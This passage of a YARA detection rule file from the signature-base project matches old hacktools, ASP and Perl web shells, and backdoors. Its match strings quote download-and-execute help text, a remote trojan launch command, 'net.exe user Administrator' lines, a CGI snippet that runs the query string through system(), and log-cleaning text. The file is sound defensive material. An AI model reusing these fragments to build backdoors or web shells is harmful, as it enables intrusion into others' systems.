		id = "f5965aa8-0f78-56fd-8e3e-6dc013942cb3"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1915-L1933"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f"
		logic_hash = "771b45473c48618c43c6be84dd37b2ccb23643f1674d437763cb78ce560067c0"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Sniff" fullword ascii
		$s3 = "GetLas" fullword ascii
		$s4 = "VersionExA" fullword ascii
		$s10 = " Only RuntUZ" fullword ascii
		$s12 = "emcpysetprintf\\" ascii
		$s13 = "WSFtartup" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Aspfile2
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "42bbcc16-a6d7-53d7-8651-1a28c6b26ee8"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1935-L1951"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "14efbc6cb01b809ad75a535d32b9da4df517ff29"
		logic_hash = "0fd52e646751b14840f30100382c5171fd001c05110dccb4ac87be9b2c4b6131"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "response.write \"command completed success!\" " fullword ascii
		$s1 = "for each co in foditems " fullword ascii
		$s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
		$s19 = "<title>Hello! Welcome </title>" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Unpack_Rar_Folder_Injectt
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "cc7d1a36-1214-5a14-8589-9eb2339a8700"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1953-L1976"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6"
		logic_hash = "f9d682a9438f49cf8292c33e680537d8c2137b8cba2670430b92d0a620de85b9"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "%s -Install                          -->To Install The Service" fullword ascii
		$s1 = "Explorer.exe" fullword ascii
		$s2 = "%s -Start                            -->To Start The Service" fullword ascii
		$s3 = "%s -Stop                             -->To Stop The Service" fullword ascii
		$s4 = "The Port Is Out Of Range" fullword ascii
		$s7 = "Fail To Set The Port" fullword ascii
		$s11 = "\\psapi.dll" ascii
		$s20 = "TInject.Dll" fullword ascii
		$x1 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
		$x2 = "injectt.exe" fullword ascii

	condition:
		(1 of ( $x* ) ) and ( 3 of ( $s* ) )
}

rule SIGNATURE_BASE_Jc_Wineggdrop_Shell
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "219df3a1-fe1c-5d33-ab3e-1b3cbd104c9e"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1978-L1997"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "820674b59f32f2cf72df50ba4411d7132d863ad2"
		logic_hash = "af43980b4052cef56884e9d6bdbb12919f1a86420a3f189e30fba624ab37a420"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Sniffer.dll" fullword ascii
		$s4 = ":Execute net.exe user Administrator pass" fullword ascii
		$s5 = "Fport.exe or mport.exe " fullword ascii
		$s6 = ":Password Sniffering Is Running |Not Running " fullword ascii
		$s9 = ": The Terminal Service Port Has Been Set To NewPort" fullword ascii
		$s15 = ": Del www.exe                   " fullword ascii
		$s20 = ":Dir *.exe                    " fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Aspbackdoor_Asp1
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp1.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "fa5128c5-efd5-55dd-880a-2952942e2035"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1999-L2017"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9ef9f34392a673c64525fcd56449a9fb1d1f3c50"
		logic_hash = "7ce1911d7524e9961f907f863b3966817bcad7a571c933dac6a76e1d8a1eeaf8"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
		$s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
		$s6 = "set rs=conn.execute (sql)%> " fullword ascii
		$s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
		$s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
		$s15 = "sql=\"select * from scjh\" " fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_QQ_Zip_Folder_QQ
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file QQ.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "30da6292-f670-5b73-985a-3028e20607be"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2019-L2039"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb"
		logic_hash = "d2517c3646b9a3babfa767c5c57b4b576fda471c190ab66e1054c4de359713ad"
		score = 60
		quality = 35
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "EMAIL:haoq@neusoft.com" fullword wide
		$s1 = "EMAIL:haoq@neusoft.com" fullword wide
		$s4 = "QQ2000b.exe" fullword wide
		$s5 = "haoq@neusoft.com" fullword ascii
		$s9 = "QQ2000b.exe" fullword ascii
		$s10 = "\\qq2000b.exe" ascii
		$s12 = "WINDSHELL STUDIO[WINDSHELL " fullword wide
		$s17 = "SOFTWARE\\HAOQIANG\\" ascii

	condition:
		5 of them
}

rule SIGNATURE_BASE_Unpack_Rar_Folder_Tback
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file TBack.DLL"
		author = "Florian Roth (Nextron Systems)"
		id = "f672f987-0d43-53df-8338-084907b6da16"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2041-L2069"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "30fc9b00c093cec54fcbd753f96d0ca9e1b2660f"
		logic_hash = "89f978742ab952b727a9a8dbab0cd88cfc07440e8c4f974dcfa14ed630083761"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Redirect SPort RemoteHost RPort       -->Port Redirector" fullword ascii
		$s1 = "http://IP/a.exe a.exe                 -->Download A File" fullword ascii
		$s2 = "StopSniffer                           -->Stop Pass Sniffer" fullword ascii
		$s3 = "TerminalPort Port                     -->Set New Terminal Port" fullword ascii
		$s4 = "Example: Http://12.12.12.12/a.exe abc.exe" fullword ascii
		$s6 = "Create Password Sniffering Thread Successfully. Status:Logging" fullword ascii
		$s7 = "StartSniffer NIC                      -->Start Sniffer" fullword ascii
		$s8 = "Shell                                 -->Get A Shell" fullword ascii
		$s11 = "DeleteService ServiceName             -->Delete A Service" fullword ascii
		$s12 = "Disconnect ThreadNumber|All           -->Disconnect Others" fullword ascii
		$s13 = "Online                                -->List All Connected IP" fullword ascii
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword ascii
		$s16 = "Example: Set REG_SZ Test Trojan.exe" fullword ascii
		$s18 = "Execute Program                       -->Execute A Program" fullword ascii
		$s19 = "Reboot                                -->Reboot The System" fullword ascii
		$s20 = "Password Sniffering Is Not Running" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Rangescan
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file RangeScan.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "143d9e1e-41e2-579a-beee-30da2cf068f7"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2090-L2107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bace2c65ea67ac4725cb24aa9aee7c2bec6465d7"
		logic_hash = "f334a59c2d95505807df642a8d5605b1b7d8b3385a552e8f5a37f344d7a75412"
		score = 60
		quality = 35
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RangeScan.EXE" fullword wide
		$s4 = "<br><p align=\"center\"><b>RangeScan " fullword ascii
		$s9 = "Produced by isn0" fullword ascii
		$s10 = "RangeScan" fullword wide
		$s20 = "%d-%d-%d %d:%d:%d" fullword ascii

	condition:
		3 of them
}

rule SIGNATURE_BASE_Xyzcmd_Zip_Folder_Readme
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file Readme.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "cee0f8c3-f947-50a5-ae8c-4ce83ef5e433"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2109-L2123"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "967cb87090acd000d22e337b8ce4d9bdb7c17f70"
		logic_hash = "38d69eee78ff8fa2ad064871481bd1b8a926146922952c7e199d27c809d0c980"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "3.xyzcmd \\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe" fullword ascii
		$s20 = "XYZCmd V1.0" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Sqlcmd
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcmd.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0efdfac7-5a89-5251-b583-12b0a58c48ff"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2142-L2161"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a"
		logic_hash = "1e41c38da7552d6a25c918547a39ed07ec38a537fd04e2090d1199c4fb0e3b1e"
		score = 40
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Permission denial to EXEC command.:(" ascii
		$s3 = "by Eyas<cooleyas@21cn.com>" fullword ascii
		$s4 = "Connect to %s MSSQL server success.Enjoy the shell.^_^" fullword ascii
		$s5 = "Usage: %s <host> <uid> <pwd>" fullword ascii
		$s6 = "SqlCmd2.exe Inside Edition." fullword ascii
		$s7 = "Http://www.patching.net  2000/12/14" fullword ascii
		$s11 = "Example: %s 192.168.0.1 sa \"\"" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Aspack_ASPACK
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPACK.EXE"
		author = "Florian Roth (Nextron Systems)"
		id = "ca9a25f9-a94b-5e10-b935-c6e2d38d999c"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2163-L2178"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c589e6fd48cfca99d6335e720f516e163f6f3f42"
		logic_hash = "1c7abc0a126ee8c8b20e55ad85974067f1a230efc5f95a1a1e732025e39d5bab"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "ASPACK.EXE" fullword wide
		$s5 = "CLOSEDFOLDER" fullword wide
		$s10 = "ASPack compressor" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_2323
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file 2323.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "445f6a49-51e6-5eb8-ae08-e5989aafb6c4"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2180-L2198"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "21812186a9e92ee7ddc6e91e4ec42991f0143763"
		logic_hash = "1278c53f64a0ba7f3f6a728237eac6808b260ad36551923276bfba9b36586870"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "port - Port to listen on, defaults to 2323" fullword ascii
		$s1 = "Usage: srvcmd.exe [/h] [port]" fullword ascii
		$s3 = "Failed to execute shell" fullword ascii
		$s5 = "/h   - Hide Window" fullword ascii
		$s7 = "Accepted connection from client at %s" fullword ascii
		$s9 = "Error %d: %s" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Jc_ALL_Wineggdropshell_Rar_Folder_Install_2
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file Install.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "ebfc8e53-328c-5deb-bf9b-e0270f171c68"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2200-L2218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "95866e917f699ee74d4735300568640ea1a05afd"
		logic_hash = "9c12e8491918a656e37b4ee6c3a42ec970cb6cf101ca5fe3fdfe9eab16526219"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "http://go.163.com/sdemo" fullword wide
		$s2 = "Player.tmp" fullword ascii
		$s3 = "Player.EXE" fullword wide
		$s4 = "mailto:sdemo@263.net" fullword ascii
		$s5 = "S-Player.exe" fullword ascii
		$s9 = "http://www.BaiXue.net (" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_TFTPD32
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file TFTPD32.EXE"
		author = "Florian Roth (Nextron Systems)"
		id = "071fba15-affe-539a-bcc0-c14943fff51a"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2220-L2241"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8"
		logic_hash = "cbf239330f8f1fd8be3ef3c93571c723447ca3b814fb7c1eff5ea4b2e7f5364f"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " http://arm.533.net" fullword ascii
		$s1 = "Tftpd32.hlp" fullword ascii
		$s2 = "Timeouts and Ports should be numerical and can not be 0" fullword ascii
		$s3 = "TFTPD32 -- " fullword wide
		$s4 = "%d -- %s" fullword ascii
		$s5 = "TIMEOUT while waiting for Ack block %d. file <%s>" fullword ascii
		$s12 = "TftpPort" fullword ascii
		$s13 = "Ttftpd32BackGround" fullword ascii
		$s17 = "SOFTWARE\\TFTPD32" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Iecv
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file iecv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "08126db3-267b-5289-b562-40bc264f6e3e"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2243-L2260"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6e6e75350a33f799039e7a024722cde463328b6d"
		logic_hash = "e2985d85030d88cb63eb8b80673812f85aea6e11c6aeb430387cdb8886958b6a"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Edit The Content Of Cookie " fullword wide
		$s3 = "Accessories\\wordpad.exe" fullword ascii
		$s4 = "gorillanation.com" fullword ascii
		$s5 = "Before editing the content of a cookie, you should close all windows of Internet" ascii
		$s12 = "http://nirsoft.cjb.net" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Antiy_Ports_1_21
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "eb53fc91-4dec-5416-a2c7-1e8256297886"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2262-L2277"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0"
		logic_hash = "fb175c413faf0ca33cf166029b217aac31126d6cabc81883c16b2de2ab00c16c"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "AntiyPorts.EXE" fullword wide
		$s7 = "AntiyPorts MFC Application" fullword wide
		$s20 = " @Stego:" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Perlcmd_Zip_Folder_Cmd
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file cmd.cgi"
		author = "Florian Roth (Nextron Systems)"
		id = "19e4eca0-bd56-57af-afd2-ee2fc5c7c0df"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2279-L2299"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "21b5dc36e72be5aca5969e221abfbbdd54053dd8"
		logic_hash = "4391207d66b7ed5ac2db127d3efcf22f8c2bbd0ee1f0c6982d656b91e5e10c8f"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "syswrite(STDOUT, \"Content-type: text/html\\r\\n\\r\\n\", 27);" fullword ascii
		$s1 = "s/%20/ /ig;" fullword ascii
		$s2 = "syswrite(STDOUT, \"\\r\\n</PRE></HTML>\\r\\n\", 17);" fullword ascii
		$s4 = "open(STDERR, \">&STDOUT\") || die \"Can't redirect STDERR\";" fullword ascii
		$s5 = "$_ = $ENV{QUERY_STRING};" fullword ascii
		$s6 = "$execthis = $_;" fullword ascii
		$s7 = "system($execthis);" fullword ascii
		$s12 = "s/%2f/\\//ig;" fullword ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_Aspbackdoor_Asp3
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp3.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "ed86e829-449b-5088-a105-f1fe79547540"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2301-L2321"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e5588665ca6d52259f7d9d0f13de6640c4e6439c"
		logic_hash = "c62ae1d32e93a8614a8288ce2df8e26806ab67b3b133067182f0396f0f080b78"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
		$s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
		$s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
		$s14 = " Windows NT " fullword ascii
		$s16 = " WIndows 2000 " fullword ascii
		$s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
		$s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
		$s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Fpipe
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0b2f11d9-a919-5790-8724-d2f028e4fa3a"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2323-L2341"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
		logic_hash = "ecf143c231aeb37cf9575c3ea8db83c9a049e85a7c95668deeac0878f9c30b9c"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s3 = " -s    - outbound source port number" fullword ascii
		$s5 = "http://www.foundstone.com" fullword ascii
		$s20 = "Attempting to connect to %s port %d" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Concon
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file concon.com"
		author = "Florian Roth (Nextron Systems)"
		id = "ca7862cc-1053-5fce-a569-6ecc069314df"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2343-L2356"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "816b69eae66ba2dfe08a37fff077e79d02b95cc1"
		logic_hash = "c45955cc59970657f8787ddc0e549939d2fa30d11cfd19fd12cd9067abb3bcd6"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Usage: concon \\\\ip\\sharename\\con\\con" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Aspbackdoor_Regdll
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file regdll.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "37096c50-68d0-5412-847a-022062a5ff2a"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2358-L2374"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5c5e16a00bcb1437bfe519b707e0f5c5f63a488d"
		logic_hash = "89606ccf4341ba9451fd1bfbc818bbcd55d45d50e06f09b9f1ecd8efb3c322af"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "exitcode = oShell.Run(\"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, " ascii
		$s3 = "oShell.Run \"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, False" fullword ascii
		$s4 = "EchoB(\"regsvr32.exe exitcode = \" & exitcode)" fullword ascii
		$s5 = "Public Property Get oFS()" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Cleaniislog
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file CleanIISLog.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "439726c6-3262-59ef-9a54-7dcd98cf924d"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2376-L2397"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "827cd898bfe8aa7e9aaefbe949d26298f9e24094"
		logic_hash = "77a26e57b36f73d4d2730bc3a4d8485718119e2ccc80b40de3515ec688616eb9"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "CleanIP - Specify IP Address Which You Want Clear." fullword ascii
		$s2 = "LogFile - Specify Log File Which You Want Process." fullword ascii
		$s8 = "CleanIISLog Ver" fullword ascii
		$s9 = "msftpsvc" fullword ascii
		$s10 = "Fatal Error: MFC initialization failed" fullword ascii
		$s11 = "Specified \"ALL\" Will Process All Log Files." fullword ascii
		$s12 = "Specified \".\" Will Clean All IP Record." fullword ascii
		$s16 = "Service %s Stopped." fullword ascii
		$s20 = "Process Log File %s..." fullword ascii

	condition:
		5 of them
}

rule SIGNATURE_BASE_Sqlcheck
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcheck.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "a72d38ef-b2e7-5051-8538-724d9e95fa6a"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2399-L2416"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5a5778ac200078b627db84fdc35bf5bcee232dc7"
